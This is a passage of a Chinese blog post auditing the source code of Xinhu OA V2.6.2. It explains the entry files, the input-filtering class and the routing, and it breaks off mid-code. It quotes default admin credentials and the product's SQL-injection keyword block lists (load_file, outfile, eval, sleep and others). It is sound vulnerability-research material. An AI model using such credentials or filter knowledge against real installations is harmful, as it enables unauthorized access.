<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="https:&#x2F;&#x2F;www.freebuf.com&#x2F;articles&#x2F;web&#x2F;286380.html 信呼OA 审计admin qwer1234信呼OA是一款自主MVC的办公系统，官网：http:&#x2F;&#x2F;www.rockoa.com&#x2F; 入口分析index.php 中 include_once(&#39;config&#x2F;config.php&#39;); 跟进到 config&#x2F;config.php查看@ses">
<meta property="og:type" content="article">
<meta property="og:title" content="【代码审计】信呼OA V2.6.2 代码审计">
<meta property="og:url" content="https://godreams.cn/2024/10/03/WebSecurity/codeaudit/xinhuoaaudit/index.html">
<meta property="og:site_name" content="g0dam">
<meta property="og:description" content="https:&#x2F;&#x2F;www.freebuf.com&#x2F;articles&#x2F;web&#x2F;286380.html 信呼OA 审计admin qwer1234信呼OA是一款自主MVC的办公系统，官网：http:&#x2F;&#x2F;www.rockoa.com&#x2F; 入口分析index.php 中 include_once(&#39;config&#x2F;config.php&#39;); 跟进到 config&#x2F;config.php查看@ses">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://godreams.cn/2024/10/03/WebSecurity/codeaudit/xinhuoaaudit/image.png">
<meta property="og:image" content="https://godreams.cn/2024/10/03/WebSecurity/codeaudit/xinhuoaaudit/image-1.png">
<meta property="og:image" content="https://godreams.cn/2024/10/03/WebSecurity/codeaudit/xinhuoaaudit/image-2.png">
<meta property="article:published_time" content="2024-10-03T03:10:22.000Z">
<meta property="article:modified_time" content="2024-11-12T13:39:37.513Z">
<meta property="article:author" content="g0dam">
<meta property="article:tag" content="代码审计">
<meta property="article:tag" content="OA">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://godreams.cn/2024/10/03/WebSecurity/codeaudit/xinhuoaaudit/image.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>【代码审计】信呼OA V2.6.2 代码审计</title>
    <!-- async scripts -->
    <!-- Google Analytics -->


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
      <link rel="alternate" href="/true" title="g0dam" type="application/atom+xml" />
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 7.3.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     --><!--
       --><li><a href="/categories/">Categories</a></li><!--
     --><!--
       --><li><a href="/idea/">Idea</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="https://github.com/g0dam">Projects</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="Previous post" href="/2024/10/10/WebSecurity/codeaudit/phpaudit2/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Next post" href="/2024/10/02/WebSecurity/codeaudit/phpaudit/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://godreams.cn/2024/10/03/WebSecurity/codeaudit/xinhuoaaudit/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://godreams.cn/2024/10/03/WebSecurity/codeaudit/xinhuoaaudit/&text=【代码审计】信呼OA V2.6.2 代码审计"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://godreams.cn/2024/10/03/WebSecurity/codeaudit/xinhuoaaudit/&title=【代码审计】信呼OA V2.6.2 代码审计"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://godreams.cn/2024/10/03/WebSecurity/codeaudit/xinhuoaaudit/&is_video=false&description=【代码审计】信呼OA V2.6.2 代码审计"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=【代码审计】信呼OA V2.6.2 代码审计&body=Check out this article: https://godreams.cn/2024/10/03/WebSecurity/codeaudit/xinhuoaaudit/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://godreams.cn/2024/10/03/WebSecurity/codeaudit/xinhuoaaudit/&title=【代码审计】信呼OA V2.6.2 代码审计"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://godreams.cn/2024/10/03/WebSecurity/codeaudit/xinhuoaaudit/&title=【代码审计】信呼OA V2.6.2 代码审计"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://godreams.cn/2024/10/03/WebSecurity/codeaudit/xinhuoaaudit/&title=【代码审计】信呼OA V2.6.2 代码审计"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://godreams.cn/2024/10/03/WebSecurity/codeaudit/xinhuoaaudit/&title=【代码审计】信呼OA V2.6.2 代码审计"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://godreams.cn/2024/10/03/WebSecurity/codeaudit/xinhuoaaudit/&name=【代码审计】信呼OA V2.6.2 代码审计&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://godreams.cn/2024/10/03/WebSecurity/codeaudit/xinhuoaaudit/&t=【代码审计】信呼OA V2.6.2 代码审计"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E5%91%BCOA-%E5%AE%A1%E8%AE%A1"><span class="toc-number">1.</span> <span class="toc-text">信呼OA 审计</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%A5%E5%8F%A3%E5%88%86%E6%9E%90"><span class="toc-number">2.</span> <span class="toc-text">入口分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Rockclass"><span class="toc-number">3.</span> <span class="toc-text">Rockclass</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9E%E5%88%B0index"><span class="toc-number">4.</span> <span class="toc-text">回到index</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9A%8F%E4%BE%BF%E6%89%BE%E4%B8%AA%E5%8A%9F%E8%83%BD%E7%82%B9"><span class="toc-number">5.</span> <span class="toc-text">随便找个功能点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2024-7327"><span class="toc-number">6.</span> <span class="toc-text">CVE-2024-7327</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E5%91%BCOA%E6%99%AE%E9%80%9A%E7%94%A8%E6%88%B7%E6%9D%83%E9%99%90getshell"><span class="toc-number">7.</span> <span class="toc-text">信呼OA普通用户权限getshell</span></a></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        【代码审计】信呼OA V2.6.2 代码审计
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">g0dam</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2024-10-03T03:10:22.000Z" class="dt-published" itemprop="datePublished">2024-10-03</time>
        
      
    </div>


      
    <div class="article-category">
        <i class="fa-solid fa-archive"></i>
        <a class="category-link" href="/categories/Code-Audit/">Code Audit</a>
    </div>


      
    <div class="article-tag">
        <i class="fa-solid fa-tag"></i>
        <a class="p-category" href="/tags/OA/" rel="tag">OA</a>, <a class="p-category" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a>
    </div>


    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/286380.html">https://www.freebuf.com/articles/web/286380.html</a></p>
<h2 id="信呼OA-审计"><a href="#信呼OA-审计" class="headerlink" title="信呼OA 审计"></a>信呼OA 审计</h2><p>admin qwer1234<br>信呼OA是一款自主MVC的办公系统，官网：<a target="_blank" rel="noopener" href="http://www.rockoa.com/">http://www.rockoa.com/</a></p>
<h2 id="入口分析"><a href="#入口分析" class="headerlink" title="入口分析"></a>入口分析</h2><p>index.php 中 <code>include_once(&#39;config/config.php&#39;);</code> 跟进到 <code>config/config.php</code>查看<br><img src="/2024/10/03/WebSecurity/codeaudit/xinhuoaaudit/image.png"><br><code>@session_start();</code> 这行代码在 PHP 中用来启动一个新的会话或者继续当前会话。这里解释一下各个组成部分的含义和作用：</p>
<ol>
<li><p><strong><code>session_start()</code> 函数</strong>：</p>
<ul>
<li>这个函数用来创建一个会话或者恢复基于会话标识符传递的当前已存在的会话。该函数使得 PHP 脚本能够使用 <code>$_SESSION</code> 超全局数组存储和访问会话数据。通过会话，服务器能够存储关于用户的状态信息（如用户身份验证状态、购物车内容等）。</li>
<li>会话数据在服务器端保存，通常在服务器的临时目录下，而不是用户的计算机上，从而增加了数据的安全性。客户端浏览器会保存一个会话 ID 的 cookie，该 ID 用来在多个页面请求之间识别用户。</li>
</ul>
</li>
<li><p><strong><code>@</code> 错误控制运算符</strong>：</p>
<ul>
<li>在 PHP 中，<code>@</code> 符号是一个错误控制运算符，用于抑制表达式可能产生的错误消息。当在表达式前加上 <code>@</code> 时，任何由该表达式产生的错误都不会显示出来，这使得代码在遇到非致命错误时可以继续执行。</li>
<li>使用这个运算符可以防止用户看到一些可能由会话启动问题（例如，当会话已经在另一个脚本中启动时）引起的警告信息。</li>
</ul>
</li>
<li><p><strong><code>if(function_exists(&#39;date_default_timezone_set&#39;))date_default_timezone_set(&#39;Asia/Shanghai&#39;);</code></strong></p>
<ul>
<li>这里检查 <code>date_default_timezone_set</code> 函数是否存在（主要是为了向后兼容老版本的PHP）。如果存在，就将默认时区设置为<code>&#39;Asia/Shanghai&#39;</code>。确保了所有基于时间的函数都将使用这个时区。</li>
</ul>
</li>
<li><p><strong><code>header(&#39;Content-Type:text/html;charset=utf-8&#39;);</code></strong></p>
<ul>
<li>这行代码设置HTTP响应的Content-Type头为<code>text/html</code>，并指定字符集为<code>UTF-8</code>。这告诉浏览器返回的内容是HTML文本，并且使用UTF-8编码，有助于正确显示包括中文在内的各种字符。</li>
</ul>
</li>
<li><p><strong><code>define(&#39;ROOT_PATH&#39;,str_replace(&#39;\\&#39;,&#39;/&#39;,dirname(dirname(__FILE__))));</code></strong></p>
<ul>
<li>这行代码定义了一个常量<code>ROOT_PATH</code>，用于存储系统的根目录路径。它使用<code>dirname(dirname(__FILE__))</code>来找到当前文件的上级目录的上级目录（即根目录），并将所有的反斜杠(‘\‘)替换为正斜杠(‘&#x2F;‘)，以保证路径在不同操作系统下都是有效的。</li>
</ul>
</li>
</ol>
<p>之后分析包含的其中包含的文件<code>rockFun.php, Chajian.php</code>，其中都没什么内容，rockclass.php深入分析</p>
<h2 id="Rockclass"><a href="#Rockclass" class="headerlink" title="Rockclass"></a>Rockclass</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;		</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;ip		= <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getclientip</span>();  <span class="comment">// 获取客户端 IP 地址</span></span><br><span class="line">		<span class="variable language_">$this</span>-&gt;host		= <span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_HOST&#x27;</span>])		? <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_HOST&#x27;</span>]		: <span class="string">&#x27;&#x27;</span> ;  <span class="comment">// 获取和处理 HTTP 主机名</span></span><br><span class="line">		<span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;host &amp;&amp; <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;host,-<span class="number">3</span>)==<span class="string">&#x27;:80&#x27;</span>)<span class="variable language_">$this</span>-&gt;host = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;:80&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$this</span>-&gt;host);   <span class="comment">// 如果主机名以端口号 80 结束，则从主机名中移除端口号。</span></span><br><span class="line">		<span class="variable language_">$this</span>-&gt;url		= <span class="string">&#x27;&#x27;</span>;  <span class="comment">// 当前 URL</span></span><br><span class="line">		<span class="variable language_">$this</span>-&gt;isqywx	= <span class="literal">false</span>;  <span class="comment">// 是否企业微信</span></span><br><span class="line">		<span class="variable language_">$this</span>-&gt;win		= <span class="title function_ invoke__">php_uname</span>();  <span class="comment">// 当前操作系统</span></span><br><span class="line">		<span class="variable language_">$this</span>-&gt;HTTPweb	= <span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>])? <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>]	: <span class="string">&#x27;&#x27;</span> ;  <span class="comment">// 获取客户端浏览器信息</span></span><br><span class="line">		<span class="variable language_">$this</span>-&gt;web		= <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getbrowser</span>();  <span class="comment">// 获取客户端浏览器信息</span></span><br><span class="line">		<span class="variable language_">$this</span>-&gt;unarr	= <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;,&#x27;</span>,<span class="string">&#x27;1,2&#x27;</span>);  <span class="comment">// 允许上传文件类型</span></span><br><span class="line">		<span class="variable language_">$this</span>-&gt;now		= <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">now</span>();  <span class="comment">// 当前时间</span></span><br><span class="line">		<span class="variable language_">$this</span>-&gt;date		= <span class="title function_ invoke__">date</span>(<span class="string">&#x27;Y-m-d&#x27;</span>);  <span class="comment">// 当前日期</span></span><br><span class="line">		<span class="variable language_">$this</span>-&gt;lvlaras  = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;,&#x27;</span>,<span class="string">&#x27;select ,</span></span><br><span class="line"><span class="string">		alter table,delete ,drop ,update ,insert into,load_file,/*,*/,union,&lt;script,&lt;/script,sleep(,outfile,eval(,user(,phpinfo(),select*,union%20,sleep%20,select%20,delete%20,drop%20,and%20&#x27;</span>);  <span class="comment">// SQL 注入关键字</span></span><br><span class="line">		<span class="variable language_">$this</span>-&gt;lvlaraa  = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;,&#x27;</span>,<span class="string">&#x27;select,alter,delete,drop,update,/*,*/,insert,from,time_so_sec,convert,from_unixtime,unix_timestamp,curtime,time_format,union,concat,information_schema,group_concat,length,load_file,outfile,database,system_user,current_user,user(),found_rows,declare,master,exec,(),select*from,select*&#x27;</span>);  <span class="comment">// SQL 注入关键字</span></span><br><span class="line">		<span class="variable language_">$this</span>-&gt;lvlarab	= <span class="keyword">array</span>();  </span><br><span class="line">		<span class="keyword">foreach</span>(<span class="variable language_">$this</span>-&gt;lvlaraa <span class="keyword">as</span> <span class="variable">$_i</span>)<span class="variable language_">$this</span>-&gt;lvlarab[]=<span class="string">&#x27;&#x27;</span>;   <span class="comment">// 创建一个与 $this-&gt;lvlaraa 数组相同大小的空数组，用于存储过滤后的 SQL 注入关键字。</span></span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p>XSS过滤</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">xssrepstr</span>(<span class="params"><span class="variable">$str</span></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="variable">$xpd</span>  = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;,&#x27;</span>,<span class="string">&#x27;(,), ,	,&lt;,&gt;,\\,*,&amp;,%,$,^,[,],&#123;,&#125;,!,@,#,&quot;,+,?,;\&#x27;&#x27;</span>);</span><br><span class="line">		<span class="variable">$xpd</span>[]= <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">		<span class="keyword">return</span> <span class="title function_ invoke__">str_ireplace</span>(<span class="variable">$xpd</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p>获取客户端IP地址</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">	*	获取IP</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getclientip</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="variable">$ip</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">		<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_CLIENT_IP&#x27;</span>]))&#123;</span><br><span class="line">			<span class="variable">$ip</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_CLIENT_IP&#x27;</span>];</span><br><span class="line">		&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>]))&#123;</span><br><span class="line">			<span class="variable">$ip</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>];</span><br><span class="line">		&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]))&#123;</span><br><span class="line">			<span class="variable">$ip</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="variable">$ip</span>= <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$this</span>-&gt;<span class="title function_ invoke__">xssrepstr</span>(<span class="variable">$ip</span>));</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$ip</span>)&#123;<span class="variable">$ipar</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>, <span class="variable">$ip</span>);<span class="keyword">foreach</span>(<span class="variable">$ipar</span> <span class="keyword">as</span> <span class="variable">$ip1</span>)<span class="keyword">if</span>(!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$ip1</span>))<span class="variable">$ip</span>=<span class="string">&#x27;&#x27;</span>;&#125;</span><br><span class="line">		<span class="keyword">if</span>(!<span class="variable">$ip</span>)<span class="variable">$ip</span> = <span class="string">&#x27;unknow&#x27;</span>;</span><br><span class="line">		<span class="keyword">return</span> <span class="variable">$ip</span>;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p><code>iconvsql</code> 方法</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">iconvsql</span>(<span class="params"><span class="variable">$str</span>,<span class="variable">$lx</span>=<span class="number">0</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$str</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="variable">$this</span>-&gt;lvlaraa,<span class="variable">$this</span>-&gt;lvlarab,<span class="variable">$str</span>);</span><br><span class="line">    <span class="variable">$str</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;\n&quot;</span>,<span class="string">&#x27;&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$lx</span>==<span class="number">1</span>) <span class="variable">$str</span> = <span class="title function_ invoke__">str_replace</span>(<span class="keyword">array</span>(<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;	&#x27;</span>),<span class="keyword">array</span>(<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>),<span class="variable">$str</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>功能与作用：</strong></p>
<ul>
<li>这个方法用于处理和清理 SQL 语句，以防止 SQL 注入攻击。</li>
<li><code>str_ireplace($this-&gt;lvlaraa, $this-&gt;lvlarab, $str)</code> 替换掉字符串 <code>$str</code> 中所有在 <code>$this-&gt;lvlaraa</code> 数组中定义的SQL关键词为 <code>$this-&gt;lvlarab</code> 数组中相应的空字符串，这种方法用于尝试清除可能导致SQL注入的语句。</li>
<li><code>str_replace(&quot;\n&quot;, &#39;&#39;, $str)</code> 移除字符串中的所有换行符。</li>
<li>如果参数 <code>$lx</code> 等于 <code>1</code>，则进一步移除字符串中的所有空格和制表符。这可能用于进一步减少 SQL 语句中不必要的空白，以减小其在数据库查询中的潜在危险。</li>
</ul>
<p><code>unstr</code> 方法</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">unstr</span>(<span class="params"><span class="variable">$str</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$ystr</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span>&lt;<span class="title function_ invoke__">count</span>(<span class="variable">$this</span>-&gt;unarr); <span class="variable">$i</span>++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">contain</span>(<span class="variable">$str</span>, <span class="variable">$this</span>-&gt;unarr[<span class="variable">$i</span>]))&#123;</span><br><span class="line">            <span class="variable">$ystr</span> = <span class="variable language_">$this</span>-&gt;unarr[<span class="variable">$i</span>];</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$ystr</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>功能与作用：</strong></p>
<ul>
<li>这个私有方法用于检查字符串 <code>$str</code> 是否包含在类变量 <code>$this-&gt;unarr</code> 定义的特定值中。</li>
<li>通过遍历 <code>$this-&gt;unarr</code> 数组，并使用 <code>contain</code> 方法检查 <code>$str</code> 是否包含数组中的任何一个元素。如果是，就将该元素赋值给 <code>$ystr</code> 并终止循环。</li>
<li>返回的 <code>$ystr</code> 会是 <code>$str</code> 中第一个在 <code>$this-&gt;unarr</code> 数组中找到匹配的字符串，如果没有找到，则返回空字符串。</li>
</ul>
<h2 id="回到index"><a href="#回到index" class="headerlink" title="回到index"></a>回到index</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include_once</span>(<span class="string">&#x27;config/config.php&#x27;</span>);</span><br><span class="line"><span class="variable">$_uurl</span> 		= <span class="variable">$rock</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;rewriteurl&#x27;</span>);</span><br><span class="line"><span class="variable">$d</span> 			= <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$m</span> 			= <span class="string">&#x27;index&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span> 			= <span class="string">&#x27;default&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_uurl</span> != <span class="string">&#x27;&#x27;</span>)&#123;</span><br><span class="line">	<span class="keyword">unset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;m&#x27;</span>]);<span class="keyword">unset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;d&#x27;</span>]);<span class="keyword">unset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line">	<span class="variable">$m</span>		= <span class="variable">$_uurl</span>;</span><br><span class="line">	<span class="variable">$_uurla</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;_&#x27;</span>, <span class="variable">$_uurl</span>);</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_uurla</span>[<span class="number">1</span>]))&#123;<span class="variable">$d</span> = <span class="variable">$_uurla</span>[<span class="number">0</span>];<span class="variable">$m</span> = <span class="variable">$_uurla</span>[<span class="number">1</span>];&#125;</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_uurla</span>[<span class="number">2</span>]))&#123;<span class="variable">$d</span> = <span class="variable">$_uurla</span>[<span class="number">0</span>];<span class="variable">$m</span> = <span class="variable">$_uurla</span>[<span class="number">1</span>];<span class="variable">$a</span> = <span class="variable">$_uurla</span>[<span class="number">2</span>];&#125;</span><br><span class="line">	<span class="variable">$_uurla</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;?&#x27;</span>,<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_URI&#x27;</span>]);</span><br><span class="line">	<span 